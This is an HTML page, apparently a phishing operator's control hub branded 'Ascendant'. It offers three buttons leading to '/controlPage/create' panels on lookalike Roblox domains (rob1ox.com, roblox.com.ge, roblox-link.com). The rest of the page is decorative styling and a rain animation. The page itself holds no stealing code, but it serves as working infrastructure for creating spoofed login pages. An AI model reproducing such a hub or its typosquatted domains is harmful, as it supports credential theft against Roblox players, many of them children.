<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ascendant - Sites</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #000000;
            overflow: hidden;
            position: relative;
            font-family: 'Arial', sans-serif;
        }

        .container {
            display: flex;
            gap: 20px;
            position: relative;
            z-index: 1;
        }

        .box {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 120px;
            height: 120px;
            text-decoration: none;
            border-radius: 12px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
            transition: background 0.5s ease, transform 0.3s ease, opacity 1s ease;
            color: #ffffff;
            font-weight: 600;
            text-align: center;
            font-size: 18px;
            z-index: 2;
            position: relative;
            background: linear-gradient(135deg, #ff6f6f, #d84c3c);
            padding: 10px;
            border: none;
            opacity: 0;
            animation: fadeIn 1s forwards;
        }

        .box:nth-child(1) {
            animation-delay: 0s;
        }

        .box:nth-child(2) {
            animation-delay: 0.5s;
        }

        .box:nth-child(3) {
            animation-delay: 1s;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        .raindrop {
            position: absolute;
            top: -10px;
            background-color: #fff;
            width: 2px;
            height: 15px;
            border-radius: 50%;
            opacity: 0.6;
            pointer-events: none;
            z-index: 0;
        }

        @keyframes rain {
            from {
                transform: translateY(-100vh);
            }
            to {
                transform: translateY(100vh);
            }
        }

        .raindrop {
            animation: rain linear;
            animation-duration: 1s;
            animation-iteration-count: infinite;
            animation-timing-function: linear;
        }

        .discord-logo {
            position: absolute;
            bottom: 20px;
            right: 20px;
            width: 50px; 
            height: auto; 
            cursor: pointer; 
            z-index: 2; 
        }

        .overlay-text {
            position: absolute;
            top: 20%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 48px;
            font-weight: bold;
            color: #d84c3c;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
            white-space: nowrap;
            z-index: 3;
            overflow: hidden;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .overlay-text span {
            display: inline-block;
            position: relative;
            color: #d84c3c;
            font-size: 48px;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
            white-space: nowrap;
            overflow: hidden;
            border-right: 2px solid #d84c3c;
            animation: typing 4s steps(30, end) 1s 1 normal both, blink 0.75s step-end 4s infinite;
        }

        @keyframes typing {
            from { width: 0; }
            to { width: 100%; }
        }

        @keyframes blink {
            0%, 100% { border-color: transparent; }
            50% { border-color: #d84c3c; }
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="https://rob1ox.com/controlPage/create" class="box" id="box1">rob1ox.com</a>
        <a href="https://roblox.com.ge/controlPage/create" class="box" id="box2">roblox.com.ge</a>
        <a href="https://roblox-link.com/controlPage/create" class="box" id="box3">roblox-link.com</a>
    </div>
    <div class="overlay-text">
        <span>ASCENDANT</span>
    </div>
    <script>
        function createRaindrops(num) {
            const container = document.body;
            for (let i = 0; i < num; i++) {
                const raindrop = document.createElement('div');
                raindrop.classList.add('raindrop');
                raindrop.style.left = `${Math.random() * 100}vw`;
                raindrop.style.animationDuration = `${Math.random() * 1 + 0.5}s`; 
                raindrop.style.animationDelay = `${Math.random() * 3}s`; 
                raindrop.style.width = `${Math.random() * 2 + 1}px`; 
                raindrop.style.height = `${Math.random() * 15 + 10}px`; 
                container.appendChild(raindrop);
            }
        }
        createRaindrops(100);
    </script>
    </a>
</body>
</html>
